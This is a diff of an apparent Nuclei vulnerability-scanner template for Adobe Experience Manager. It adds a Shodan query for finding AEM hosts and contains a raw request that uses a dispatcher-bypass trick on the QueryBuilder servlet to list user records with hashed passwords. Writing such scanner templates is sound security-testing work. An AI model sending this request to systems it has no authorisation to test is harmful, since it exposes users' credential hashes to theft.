@@ -1,13 +1,16 @@
 id: aem-hash-querybuilder
 
 info:
-  author: DhiyaneshDk
   name: Query hashed password via QueryBuilder Servlet
+  author: DhiyaneshDk
   severity: medium
-  reference: https://twitter.com/AEMSecurity/status/1372392101829349376
+  reference:
+    - https://twitter.com/AEMSecurity/status/1372392101829349376
+  metadata:
+    shodan-query: http.component:"Adobe Experience Manager"
   tags: aem
 
-http:
+requests:
   - raw:
       - |
         GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
